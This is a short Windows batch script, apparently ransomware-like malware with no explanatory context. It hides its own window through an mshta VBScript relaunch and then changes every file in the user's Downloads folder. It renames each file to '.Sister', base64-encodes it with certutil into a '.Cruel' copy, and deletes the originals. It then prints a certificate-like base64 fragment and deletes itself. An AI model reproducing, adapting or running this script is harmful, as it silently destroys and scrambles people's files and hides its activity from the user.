@echo off 

　　if "%1" == "h" goto begin 

　　mshta vbscript:createobject("wscript.shell").run("%~nx0 h",0)(window.close)&&exit 

　　:begin

@shift /0
REM

cd %UserProFile%\Downloads\

for %%a in (*) do ren "%%a" "%%~a.Sister"&for %%a in (%0) do ren "%%~a.Sister" "%%~na.bat"

for %%a in (*.Sister) do certutil -encode "%%~a" "%%~na.Cruel" & ping -n 3 127.0.0.1 > nul


cd %UserProFile%\Downloads\
del /s /q *.Sister

echo TVqQAAMAAAAEAAAA/9OtNBjEDy9CjXs8kMWBrU=
-----END CERTIFICATE-----

:1

del %0

